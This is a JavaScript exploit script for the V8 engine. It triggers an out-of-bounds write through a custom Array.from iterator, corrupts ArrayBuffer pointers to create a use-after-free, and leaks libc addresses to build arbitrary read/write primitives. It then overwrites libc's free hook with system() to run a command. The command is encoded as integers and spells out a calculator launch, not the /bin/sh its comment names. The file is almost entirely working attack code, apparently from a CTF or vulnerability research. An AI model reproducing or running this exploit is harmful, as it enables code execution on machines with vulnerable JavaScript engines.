let oobArray = [1.1];
let maxSize = 1028 * 8;
arrayBuffers = []
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
	{
		counter : 0,
		next()
		{
			let result = this.counter++;
			if (this.counter > maxSize)
			{
				oobArray.length = 1;
				for (var i = 0; i < 0x1000; i++)
				{
					arrayBuffers.push(new ArrayBuffer(0x2000+i));
				}
				return {done: true};
			}
			else
			{
				return {value: result, done: false};
			}
		}
	}
) });

const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}

function find2ArrayBuffer(oobArray)
{
	const inSizeRange = (x) => x >= 0x2000 && x < 0x3000;
	var count = 0;
	var ret = [];
	for (let i = 0; i < oobArray.length; )
	{
		const tmp = d2u(oobArray[i]) / 0x100000000;
		if (inSizeRange(tmp) &&
			oobArray[i + 1] == oobArray[i + 2] &&
			inSizeRange(d2u(oobArray[i + 3])) &&
			tmp == d2u(oobArray[i + 3]))
		{
			ret.push({idx: tmp - 0x2000, off : i});
			++count;
			if (count >= 2)
				return ret;
			i += 4;
		}
		else
		{
			++i;
		}
	}
}
function dp(x)
{
	%DebugPrint(x);
}
//console.log(oobArray);
dp(oobArray);
jsonAB = find2ArrayBuffer(oobArray);
console.log(JSON.stringify(jsonAB));
readline()
var heap1 = d2u(oobArray[jsonAB[0].off + 1]);
var heap2 = d2u(oobArray[jsonAB[1].off + 1]);
console.log(heap1.toString(16) + ' ' + heap2.toString(16));

oobArray[jsonAB[1].off + 1] = oobArray[jsonAB[0].off + 1];
oobArray[jsonAB[1].off + 2] = oobArray[jsonAB[0].off + 2];
//rewrite the pointer to the same buffer to construct UAF
for (var i = 0; i < arrayBuffers.length; i++)
{
	if (i != jsonAB[0].idx)
		arrayBuffers[i] = undefined;
}
for (var i = 0; i < 0x1000; i++)
{
	arrayBuffers.push(new ArrayBuffer(0x2010));
}
//delete referece and trigger GC

const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
var libcAddr = d2u(tmp[0]);
libcAddr -= 0x3ec340
console.log(libcAddr.toString(16));

function memRead(addr)
{
	oobArray[jsonAB[0].off + 1] = u2d(addr);
	oobArray[jsonAB[0].off + 2] = u2d(addr);
	const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
	return d2u(tmp[0]);
}
function memWrite(addr, val)
{
	oobArray[jsonAB[0].off + 1] = u2d(addr);
	oobArray[jsonAB[0].off + 2] = u2d(addr);
	const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
	tmp[0] = u2d(val);
}
var stackAddr = memRead(libcAddr + 0x3ee098); // environ
stackAddr -= 0xd00;
console.log(stackAddr.toString(16));

//rop+shellcode
//memWrite(libcAddr + 0x3ebc30, 0x414141414141) // malloc hook


//system("/bin/sh")
memWrite(libcAddr + 0x3ed8e8, libcAddr + 0x4f440); // free hook
const binsh = new Uint32Array(new ArrayBuffer(0x30));
cmd = [1634628399, 1768042352, 1852256110, 761621871, 1668047203, 1952541813, 29295];
for (var i = 0; i < cmd.length; i++)
	binsh[i] = cmd[i];
//readline();